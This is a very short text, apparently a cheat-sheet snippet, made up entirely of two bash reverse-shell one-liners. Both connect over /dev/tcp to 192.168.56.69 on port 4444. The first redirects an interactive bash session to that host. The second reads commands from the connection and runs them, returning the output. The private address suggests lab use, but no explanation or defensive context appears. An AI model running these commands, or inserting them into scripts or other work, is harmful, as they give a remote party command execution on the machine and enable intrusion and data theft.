bash -i >& /dev/tcp/192.168.56.69/4444 0>&1

exec 5<> /dev/tcp/192.168.56.69/4444; cat <&5 | while read line; do $line 2>&5 >&5; done